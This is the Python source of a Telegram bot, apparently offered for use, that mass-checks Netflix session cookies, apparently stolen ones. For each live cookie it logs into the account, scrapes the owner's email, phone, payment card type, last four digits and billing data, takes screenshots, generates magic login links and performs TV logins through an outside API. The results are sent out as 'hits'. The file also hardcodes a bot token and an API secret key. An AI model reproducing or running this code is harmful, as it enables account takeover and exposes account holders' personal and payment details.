import requests
import random
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask

# Suppress Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(10) 
# Global Executor to prevent server crash under heavy load (100+ users)
GLOBAL_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=100)

app = Flask(__name__)

@app.route('/')
def home():
    return "Stable Scraper is Running 24/7"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
}

# API Configuration
API_BASE_URL = "http://nftgenapi.onrender.com/api"
SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

CURRENCY_MAP = {
    "US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", 
    "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", 
    "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", 
    "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", 
    "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", 
    "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", 
    "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", 
    "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei",
    "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"
}

def get_flag(code):
    if not code or code == "Unknown" or len(code) != 2: return "🌍"
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def get_currency_symbol(code):
    return CURRENCY_MAP.get(code, "$")

def clean_text(text):
    if not text: return "Unknown"
    try: return codecs.decode(text, 'unicode_escape')
    except: return text

def unix_to_date(timestamp):
    try:
        ts = int(timestamp)
        if ts > 1e12: ts = ts / 1000
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
    except: return "N/A"

def calculate_duration(member_since_str):
    try:
        since_date = datetime.strptime(member_since_str, '%Y-%m-%d')
        diff = datetime.now() - since_date
        return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
    except: return ""

def extract_deep_details(html):
    details = {
        "plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A", 
        "phone": "N/A", "country": "Unknown", "price": "Unknown", "quality": "Unknown", 
        "name": "Unknown", "extra_members": "No ❌", "member_since": "Unknown", 
        "member_duration": "", "profiles": [], "status": "Unknown", "has_ads": "No",
        "email_verified": "No ❌", "phone_verified": "No ❌", "auto_payment": "No ❌"
    }
    
    try:
        # Status
        if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html: details["status"] = "Active"
        elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html: details["status"] = "Expired"
        elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html: details["status"] = "Free/Never Paid"
        
        # Plan
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if plan_match: details["plan"] = clean_text(plan_match.group(1))
        elif re.search(r'"currentPlanName":"([^"]+)"', html): details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
        elif re.search(r'data-uia="plan-label">([^<]+)<', html): details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
        
        if "with ads" in str(details["plan"]).lower(): details["has_ads"] = "Yes"

        # Quality
        qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if qual_match: details["quality"] = clean_text(qual_match.group(1))

        # Refine Quality
        plan_lower = str(details["plan"]).lower()
        if details["quality"] == "Unknown" or "HD" in details["quality"] or "SD" in details["quality"]:
            if "premium" in plan_lower: details["quality"] = "UHD 4K"
            elif "standard" in plan_lower: details["quality"] = "Full HD (1080p)"
            elif "basic" in plan_lower: details["quality"] = "HD (720p)"
            elif "mobile" in plan_lower: details["quality"] = "SD (480p)"

        # Price
        price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if price_match: details["price"] = clean_text(price_match.group(1))
        else:
            loc_price = re.search(r'"localizedPrice":"([^"]+)"', html)
            if loc_price: details["price"] = clean_text(loc_price.group(1))
            elif re.search(r'data-uia="plan-price">([^<]+)<', html): details["price"] = clean_text(re.search(r'data-uia="plan-price">([^<]+)<', html).group(1))

        # Payment
        pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if pm_match: details["payment"] = clean_text(pm_match.group(1))
        elif re.search(r'data-uia="payment-method">([^<]+)<', html): details["payment"] = clean_text(re.search(r'data-uia="payment-method">([^<]+)<', html).group(1))
        else:
            if "Visa" in html: details["payment"] = "Visa 💳"
            elif "MasterCard" in html: details["payment"] = "MasterCard 💳"
            elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
            elif "Amex" in html: details["payment"] = "Amex 💳"
            elif "DCB" in html: details["payment"] = "Mobile Bill (DCB) 📱"
            elif "Direct Debit" in html: details["payment"] = "Direct Debit 🏦"
            elif "UPI" in html: details["payment"] = "UPI 📱"
        
        # Try to find last 4 digits
        last4 = re.search(r'"last4":"(\d+)"', html)
        if last4 and "Unknown" not in details["payment"]:
             details["payment"] += f" (**** {last4.group(1)})"

        # Name
        name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
        if name_match: details["name"] = clean_text(name_match.group(1))
        elif re.search(r'"firstName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
        elif re.search(r'data-uia="account-owner-name">([^<]+)<', html): details["name"] = clean_text(re.search(r'data-uia="account-owner-name">([^<]+)<', html).group(1))

        # Email
        email_match = re.search(r'"email":"([^"]+)"', html)
        if email_match: details["email"] = clean_text(email_match.group(1))
        else:
            uc_match = re.search(r'"userContext":\{[^}]*"email":"([^"]+)"', html)
            if uc_match: details["email"] = clean_text(uc_match.group(1))
            else:
                login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
                if login_id_match: details["email"] = clean_text(login_id_match.group(1))
                elif re.search(r'data-uia="account-email">([^<]+)<', html): details["email"] = clean_text(re.search(r'data-uia="account-email">([^<]+)<', html).group(1))
                elif re.search(r'"emailAddress":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"emailAddress":"([^"]+)"', html).group(1))

        if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"

        # Phone
        phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
        if phone_match: 
            details["phone"] = clean_text(phone_match.group(1))
            details["phone_verified"] = "Yes ✅"
        elif re.search(r'data-uia="account-phone">([^<]+)<', html):
             details["phone"] = clean_text(re.search(r'data-uia="account-phone">([^<]+)<', html).group(1))
             details["phone_verified"] = "Yes ✅"

        # Expiry
        bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if bill_match: details["expiry"] = clean_text(bill_match.group(1))
        elif re.search(r'data-uia="next-billing-date">([^<]+)<', html): 
            details["expiry"] = clean_text(re.search(r'data-uia="next-billing-date">([^<]+)<', html).group(1))

        if details["expiry"] != "N/A":
             details["auto_payment"] = "Yes ✅"

        # Member Since
        since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if since_match:
            details["member_since"] = unix_to_date(since_match.group(1))
            details["member_duration"] = calculate_duration(details["member_since"])
        elif "memberSince" in html:
             ms_ui = re.search(r'data-uia="member-since">.*?Member Since ([^<]+)', html)
             if ms_ui: details["member_since"] = clean_text(ms_ui.group(1))

        # Country
        country_match = re.search(r'"currentCountry":"([^"]+)"', html)
        if country_match: details["country"] = country_match.group(1)

        # Extra Members
        extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
        if extra_match and extra_match.group(1) == "true": details["extra_members"] = "Yes (Slot Available)"
        elif "extraMember" in html or "Extra Member" in html or "extra-member" in html: details["extra_members"] = "Yes (Slot Available)"

        # Profiles
        p_names = re.findall(r'"profileName":"([^"]+)"', html)
        if p_names: details["profiles"] = list(set([clean_text(p) for p in p_names]))
        if not details["profiles"]:
             ui_profiles = re.findall(r'class="profile-name">([^<]+)<', html)
             if ui_profiles: details["profiles"] = list(set([clean_text(p) for p in ui_profiles]))
        
        if not details["profiles"]:
             avatars = re.findall(r'"avatarName":"([^"]+)"', html)
             if avatars: details["profiles"] = list(set([clean_text(p) for p in avatars]))

    except: pass
    return details

def call_api(endpoint, payload):
    try:
        payload["secret_key"] = SECRET_KEY
        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=8)
        return resp.json()
    except: return None

def parse_smart_cookie(c_in):
    c_in = c_in.strip()
    if c_in.startswith('['):
        try:
            for c in json.loads(c_in):
                if c.get('name') == 'NetflixId': return urllib.parse.unquote(c.get('value'))
        except: pass
    match = re.search(r"NetflixId=([^;]+)", c_in)
    return urllib.parse.unquote(match.group(1)) if match else c_in

def check_cookie(cookie_input):
    nid = parse_smart_cookie(cookie_input)
    
    # 1. Get Magic Link from API
    api_res = call_api("gen", {"netflix_id": nid})
    
    # 2. Check Account Details via Requests
    with requests.Session() as session:
        session.headers.update(HEADERS)
        session.cookies.set("NetflixId", nid, domain=".netflix.com")
        
        try:
            # Check /browse first to see if alive
            resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
            if resp.status_code == 302 and "login" in resp.headers.get("Location", ""):
                return {"valid": False, "msg": "Redirected to Login"}

            # Get Account Details
            acc_resp = session.get("https://www.netflix.com/account", timeout=15)
            deep_data = extract_deep_details(acc_resp.text)
            
            # Fallback email from API if scraper failed
            if deep_data["email"] == "N/A" and api_res and api_res.get("email"):
                deep_data["email"] = api_res.get("email")
            
            # Fallback other details from API
            if deep_data["plan"] == "Unknown" and api_res and api_res.get("plan"):
                 deep_data["plan"] = api_res.get("plan")
            if deep_data["country"] == "Unknown" and api_res and api_res.get("country"):
                 deep_data["country"] = api_res.get("country")
            
            # Screenshot
            screenshot_bytes = None
            if SCREENSHOT_SEMAPHORE.acquire(timeout=15):
                try:
                    with sync_playwright() as p:
                        browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--disable-extensions', '--mute-audio'])
                        ctx = browser.new_context(viewport={'width': 1280, 'height': 720})
                        # Block heavy resources for speed
                        ctx.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "media", "font"] else route.continue_())
                        ctx.add_cookies([{'name': 'NetflixId', 'value': nid, 'domain': '.netflix.com', 'path': '/'}])
                        pg = ctx.new_page()
                        pg.goto("https://www.netflix.com/browse", timeout=8000, wait_until='domcontentloaded')
                        
                        # Fix Black Screenshot: Wait for content to render
                        try: pg.wait_for_timeout(1500)
                        except: pass
                        
                        # Fix Profiles: Extract directly from browser (Accurate)
                        try:
                            content = pg.content()
                            pw_profiles = re.findall(r'class="profile-name">([^<]+)<', content)
                            if pw_profiles:
                                deep_data["profiles"] = list(set([clean_text(p) for p in pw_profiles]))
                        except: pass

                        screenshot_bytes = pg.screenshot(type='jpeg', quality=40)
                        browser.close()
                except: pass
                finally: SCREENSHOT_SEMAPHORE.release()
                
            return {
                "valid": True, 
                "country": deep_data["country"], 
                "link": api_res.get("login_url") if api_res else "Token Not Found", 
                "data": deep_data, 
                "screenshot": screenshot_bytes
            }
        except Exception as e:
            # If requests fail but API worked, return API data
            if api_res and api_res.get("success"):
                 return {
                    "valid": True,
                    "country": "Unknown",
                    "link": api_res.get("login_url"),
                    "data": {"email": api_res.get("email", "N/A"), "plan": "Unknown", "status": "Active"},
                    "screenshot": None
                 }
            return {"valid": False, "msg": f"Error: {str(e)}"}

def main():
    keep_alive()

    bot = telebot.TeleBot(BOT_TOKEN)
    telebot.apihelper.RETRY_ON_ERROR = True 

    # Fix for 409 Conflict: Remove webhook before polling
    try:
        bot.delete_webhook()
    except: pass

    user_db = set()
    user_lock = threading.Lock()
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f: user_db = set(f.read().splitlines())
        except: pass

    def save_user(user_id):
        uid = str(user_id)
        if uid not in user_db:
            with user_lock:
                if uid not in user_db:
                    user_db.add(uid)
                    try:
                        with open(USERS_FILE, "a+") as f: f.write(f"{uid}\n")
                    except: pass

    def check_sub(user_id):
        if user_id == ADMIN_ID: return True
        for channel in CHANNELS:
            try:
                stat = bot.get_chat_member(channel, user_id).status
                if stat not in ['creator', 'administrator', 'member']: return False
            except: return False
        return True

    def send_force_join(chat_id):
        markup = types.InlineKeyboardMarkup()
        for ch in CHANNELS: markup.add(types.InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
        bot.send_message(chat_id, "⚠️ **You must join our channels to use this bot!**", reply_markup=markup, parse_mode='Markdown')

    @bot.message_handler(commands=['start'])
    def start(message):
        save_user(message.chat.id)
        if not check_sub(message.chat.id): return send_force_join(message.chat.id)
            
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
        kb.add("📺 TV Login")
        kb.add(" Stop System")
        
        welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Here is how to use this bot:\n\n1️⃣ **Select a Mode** using the buttons below.\n2️⃣ **Send your Netflix Cookies** (Text or File).\n\n🍪 **Supported Format:**\n• `NetflixId=v2...`\n\n📝 **Example:**\n`NetflixId=v2.CT...`\n\n👇 **Select Mode to Begin:**")
        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
    def verify_join(call):
        if check_sub(call.message.chat.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("📩 Send Here (DM)", "📡 Send to Channel")
            kb.add("📺 TV Login")
            kb.add(" Stop System")
            bot.send_message(call.message.chat.id, "**✅ Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
        else: bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)

    @bot.message_handler(commands=['users', 'stats'])
    def user_stats(message):
        if message.chat.id != ADMIN_ID: return
        try:
            count = 0
            if os.path.exists(USERS_FILE):
                with open(USERS_FILE, "r") as f: count = len(f.read().splitlines())
            bot.reply_to(message, f"📊 **Total Users:** {count}")
        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(commands=['broadcast'])
    def broadcast(message):
        if message.chat.id != ADMIN_ID: return
        msg = bot.reply_to(message, "📝 **Send the message (Text, Image, File) to broadcast:**")
        bot.register_next_step_handler(msg, perform_broadcast)

    def perform_broadcast(message):
        def _broadcast():
            try:
                if not os.path.exists(USERS_FILE): 
                    bot.reply_to(message, "❌ No users found.")
                    return
                with open(USERS_FILE, "r") as f: users = f.read().splitlines()
                count = 0
                for uid in users:
                    try:
                        if message.content_type == 'text':
                            bot.send_message(uid, message.text)
                        elif message.content_type == 'photo':
                            bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
                        elif message.content_type == 'document':
                            bot.send_document(uid, message.document.file_id, caption=message.caption)
                        elif message.content_type == 'video':
                            bot.send_video(uid, message.video.file_id, caption=message.caption)
                        elif message.content_type == 'audio':
                            bot.send_audio(uid, message.audio.file_id, caption=message.caption)
                        elif message.content_type == 'voice':
                            bot.send_voice(uid, message.voice.file_id, caption=message.caption)
                        count += 1
                        time.sleep(0.05)
                    except: pass
                bot.reply_to(message, f"✅ **Broadcast sent to {count} users.**")
            except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
        
        threading.Thread(target=_broadcast).start()
        bot.reply_to(message, "🚀 **Broadcast started in background...**")

    @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
    def stop_sys(message):
        save_user(message.chat.id)
        if message.chat.id in user_modes:
            user_modes[message.chat.id]['stop'] = True
        else:
            user_modes[message.chat.id] = {'stop': True}
        bot.reply_to(message, "**🛑 Scanning Stopped.**", parse_mode='Markdown')

    @bot.message_handler(func=lambda m: m.text == "📩 Send Here (DM)")
    def mode_dm(message):
        save_user(message.chat.id)
        user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
        bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')

    @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
    def mode_ch(message):
        save_user(message.chat.id)
        msg = bot.reply_to(message, "**📡 Enter Channel ID** (e.g., -100xxxx):", parse_mode='Markdown')
        bot.register_next_step_handler(msg, save_ch)

    def save_ch(message):
        try:
            chat_id = int(message.text.strip())
            user_modes[message.chat.id] = {'target': chat_id, 'stop': False}
            bot.reply_to(message, "**✅ Channel Verified.** Hits will be sent there.", parse_mode='Markdown')
        except: bot.reply_to(message, "❌ Invalid ID.")

    @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
    def tv_login_start(message):
        save_user(message.chat.id)
        msg = bot.reply_to(message, "📺 **TV Login Mode**\n\n1️⃣ Please send your **Netflix Cookie** now.", parse_mode='Markdown')
        bot.register_next_step_handler(msg, tv_login_cookie)

    def tv_login_cookie(message):
        if message.text in ["🛑 Stop System", "/start"]: return start(message)
        cookie = message.text.strip()
        if len(cookie) < 10: return bot.reply_to(message, "❌ Invalid Cookie. Try again /start")
        
        status_msg = bot.reply_to(message, "⏳ **Checking Cookie Validity...**", parse_mode='Markdown')
        res = check_cookie(cookie)
        
        if not res.get("valid"): return bot.edit_message_text(f"❌ **Invalid Cookie!**\nReason: {res.get('msg', 'Expired or Dead')}", message.chat.id, status_msg.message_id)
        
        data = res['data']
        info_text = (
            f"✅ **Cookie Valid!**\n"
            f"📧 Email: `{data.get('email', 'N/A')}`\n"
            f"👑 Plan: `{data.get('plan', 'N/A')}`\n"
            f"📺 Quality: `{data.get('quality', 'Unknown')}`\n"
            f"🌍 Country: `{res.get('country', 'Unknown')}`\n\n"
            f"💰 Price: `{data.get('price', 'Unknown')}`\n"
            f"💳 Payment: `{data.get('payment', 'Unknown')}`\n"
            f"☎️ Phone: `{data.get('phone', 'N/A')}`\n\n"
            f" **Enter 8-Digit TV Code:**"
        )
        
        bot.edit_message_text(info_text, message.chat.id, status_msg.message_id, parse_mode='Markdown')
        bot.register_next_step_handler(message, lambda m: tv_execute(m, parse_smart_cookie(message.text)))

    def tv_execute(message, nid):
        status_msg = bot.reply_to(message, "⏳ **Processing TV Login...**")
        api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": message.text.strip()})
        
        if api_res and api_res.get('success'):
            bot.edit_message_text(f"✅ **TV LOGIN SUCCESSFUL!**\n\n**Msg:** {api_res.get('message', 'Done')}", message.chat.id, status_msg.message_id, parse_mode='Markdown')
        else:
            err = api_res.get('error') if api_res else "API Error"
            bot.edit_message_text(f"❌ **TV Login Failed.**\n\n**Error:** {err}", message.chat.id, status_msg.message_id, parse_mode='Markdown')

    @bot.message_handler(content_types=['document', 'text'])
    def handle_input(message):
        uid = message.chat.id
        save_user(uid) # Save user automatically when they send any message
        if not check_sub(uid): return send_force_join(uid)
            
        mode = user_modes.get(uid)
        
        # Ignore buttons/commands
        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System", "📺 TV Login"]): return
        
        if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
        if mode.get('stop'): 
            # Auto-resume if they send a file, or ask to resume? 
            # User asked to fix stop system. Let's require button press or just resume.
            # Better to ask to select mode to confirm destination.
            return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")

        cookies = []
        is_file_input = False
        try:
            if message.content_type == 'document':
                is_file_input = True
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                
                if message.document.file_name.endswith('.zip'):
                    with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                        for filename in z.namelist():
                            if filename.endswith('.txt'):
                                with z.open(filename) as f:
                                    cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines())
                else:
                    cookies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            else:
                cookies = message.text.splitlines()
            
            # SMART FILTER: Only accept actual cookies (Ignore random chat/buttons)
            valid_cookies = []
            for c in cookies:
                c = c.strip()
                # Check for Netflix indicators or JSON/Netscape format
                if len(c) > 20 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c):
                    valid_cookies.append(c)
                elif c.startswith("{") or c.startswith("["):
                    valid_cookies.append(c)
            
            if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')

            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background._", parse_mode='Markdown')
            
            should_send_file = is_file_input or len(valid_cookies) > 1

            def background_checker(cookies, chat_id, target, send_file):
                valid_count = 0
                hits_list = [] # Store hits for summary file

                def process_cookie(cookie):
                    if user_modes.get(chat_id, {}).get('stop'): return None
                    try:
                        start_t = time.time()
                        res = check_cookie(cookie)
                        taken = round(time.time() - start_t, 2)
                        if res["valid"]:
                            send_hit(target, res, cookie, taken)
                            return (res, cookie) # Return result for file
                    except: pass
                    return None

                # Use Global Executor to handle load from 100+ users efficiently
                futures = [GLOBAL_EXECUTOR.submit(process_cookie, c) for c in cookies]
                
                for future in concurrent.futures.as_completed(futures):
                        if user_modes.get(chat_id, {}).get('stop'): break
                        result = future.result()
                        if result:
                            valid_count += 1
                            hits_list.append(result)
                
                # Generate and Send Summary File
                if hits_list and send_file:
                    try:
                        summary = f"========================================\nNETFLIX HITS SUMMARY\nAdmin: https://t.me/F88UF\nChannel: https://t.me/F88UF9844\n========================================\n\n"
                        for res, cookie in hits_list:
                            data = res.get("data", {})
                            summary += f"Country: {res.get('country', 'Unknown')}\n"
                            summary += f"Email: {data.get('email', 'N/A')}\n"
                            summary += f"Plan: {data.get('plan', 'N/A')}\n"
                            summary += f"Login: {res.get('link', 'N/A')}\n"
                            summary += f"Cookie: {cookie}\n"
                            summary += "-"*40 + "\n"
                        summary += "\n========================================\nChecked by @F88UF | Join Channel: https://t.me/F88UF9844\n========================================"
                        
                        with io.BytesIO(summary.encode('utf-8')) as f:
                            f.name = f"Netflix_Hits_by_@F88UF_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                            bot.send_document(chat_id, f, caption="📂 **Hits File by @F88UF**")
                    except Exception as e:
                        print(f"Summary Error: {e}")

                try:
                    bot.send_message(chat_id, f"✅ **Check Complete.** Hits: {valid_count}", parse_mode="Markdown")
                except: pass

            # Start background thread to prevent blocking other users
            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'], should_send_file), daemon=True).start()

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    def send_hit(chat_id, res, cookie, duration="N/A"):
        data = res.get("data", {})
        
        country_code = res.get('country', 'Unknown')
        flag = get_flag(country_code)
        currency_sym = get_currency_symbol(country_code)
        
        price = data.get('price', 'Unknown')
        if price != 'Unknown' and currency_sym not in price:
            price = f"{currency_sym} {price}"

        # HTML Escaping Helper
        def esc(t):
            if t is None: return "N/A"
            return str(t).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        login_url = res.get('link', 'https://www.netflix.com/login')
        if not login_url or "http" not in login_url:
             login_url = "https://www.netflix.com/login"

        # Profiles
        profiles = data.get('profiles', [])
        if profiles:
            profiles_str = ", ".join(profiles)
        else:
            profiles_str = "None"

        # Random Themes for Premium Look
        themes = [
            {
                "header": "<b>✨ ✪ NETFLIX PREMIUM ✪ ✨</b>",
                "status": "★ Status", "region": "🏳 Region", "since": "📆 Since",
                "acc": "<b>👤 Details</b>", "email": "✉️ Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💲 Price",
                "sub": "<b>📺 Sub</b>", "plan": "💎 Plan", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
                "bill_h": "<b>🗓 Billing</b>", "bill": "📅 Date",
                "prof": "<b>🎭 Profiles</b>",
                "link_h": "<b>🔗 Link</b>", "link_txt": "Login", "valid": "⏳ 1m",
                "time": "🚀 Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
            },
            {
                "header": "<b>💠 CYBER NETFLIX SESSION 💠</b>",
                "status": "🟢 Status", "region": "🌐 Region", "since": "📆 Since",
                "acc": "<b>🤖 Info</b>", "email": "✉️ Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "♻️ Auto", "price": "💲 Price",
                "sub": "<b>⚡ Plan</b>", "plan": "💎 Plan", "qual": "🖥 Qual", "ads": "⛔ Ads", "extra": "🫂 Extra",
                "bill_h": "<b>🗓 Bill</b>", "bill": "📅 Date",
                "prof": "<b>👥 Users</b>",
                "link_h": "<b>⛓️ Link</b>", "link_txt": "Access", "valid": "⏱️ 1m",
                "time": "🚀 Speed", "line": "══════════════════════"
            },
            {
                "header": "<b>☠︎︎ NETFLIX DARK HIT ☠︎︎</b>",
                "status": "💀 Status", "region": "🗺 Region", "since": " Since",
                "acc": "<b>🕷 Info</b>", "email": "📨 Email", "phone": "📞 Phone", "pay": "🕸 Pay", "auto": "🔄 Auto", "price": "💸 Price",
                "sub": "<b>𖤐 Plan</b>", "plan": "⚝ Type", "qual": "📺 Qual", "ads": "⛔ Ads", "extra": "👥 Extra",
                "bill_h": "<b>📅 Bill</b>", "bill": "🗓 Date",
                "prof": "<b>🎭 Users</b>",
                "link_h": "<b>🔗 Link</b>", "link_txt": "Enter", "valid": "⏳ 60s",
                "time": "⚡ Latency", "line": "━━━━━━━━━━━━━━━━━━━━━━"
            },
            {
                "header": "<b>♛ ♚ NETFLIX ROYAL ♚ ♛</b>",
                "status": "✅ Status", "region": "🌍 Region", "since": "📅 Since",
                "acc": "<b>👤 Owner</b>", "email": "📧 Email", "phone": "☎️ Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💰 Price",
                "sub": "<b>📺 Sub</b>", "plan": "👑 Plan", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
                "bill_h": "<b>📅 Bill</b>", "bill": "🗓 Date",
                "prof": "<b>🎭 Profs</b>",
                "link_h": "<b>🔗 Link</b>", "link_txt": "Login", "valid": "⏳ 1m",
                "time": "⏱ Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
            }
        ]
        
        th = random.choice(themes)

        msg = (
            f"{th['header']}\n\n"
            f"<b>{th['status']}:</b> Active\n"
            f"<b>{th['region']}:</b> {esc(country_code)} {flag}\n"
            f"<b>{th['since']}:</b> {esc(data.get('member_since', 'N/A'))} {esc(data.get('member_duration', ''))}\n\n"
            
            f"{th['acc']}\n"
            f"<b>├ {th['email']}:</b> <code>{esc(data.get('email', 'N/A'))}</code>\n"
            f"<b>├ {th['phone']}:</b> <code>{esc(data.get('phone', 'N/A'))}</code>\n"
            f"<b>├ {th['pay']}:</b> {esc(data.get('payment', 'Unknown'))}\n"
            f"<b>├ {th['auto']}:</b> {esc(data.get('auto_payment', 'No ❌'))}\n"
            f"<b>└ {th['price']}:</b> {esc(price)}\n\n"
            
            f"{th['sub']}\n"
            f"<b>├ {th['plan']}:</b> {esc(data.get('plan', 'Unknown'))}\n"
            f"<b>├ {th['qual']}:</b> {esc(data.get('quality', 'Unknown'))}\n"
            f"<b>├ {th['ads']}:</b> {esc(data.get('has_ads', 'No'))}\n"
            f"<b>└ {th['extra']}:</b> {esc(data.get('extra_members', 'No ❌'))}\n\n"
            
            f"{th['bill_h']}\n"
            f"<b>└ {th['bill']}:</b> {esc(data.get('expiry', 'N/A'))}\n\n"

            f"{th['prof']} ({len(profiles)})\n"
            f"<b>└</b> {esc(profiles_str)}\n\n"
            
            f"{th['link_h']}\n"
            f"<b>├</b> <a href='{login_url}'>{th['link_txt']}</a>\n"
            f"<b>└</b> <i>{th['valid']}</i>\n\n"
            
            f"<b>{th['time']}:</b> {duration}s\n"
            f"{th['line']}\n"
            f"<b>👨‍💻 Admin:</b> <a href='https://t.me/F88UF'>Message Me</a>\n"
            f"<b>📢 Channel:</b> <a href='https://t.me/F88UF9844'>Join Channel</a>"
        )
        
        if res.get('screenshot'):
            try:
                img = io.BytesIO(res['screenshot'])
                img.name = 'screenshot.jpg' 
                bot.send_photo(chat_id, img, caption=msg, parse_mode="HTML")
            except:
                bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)
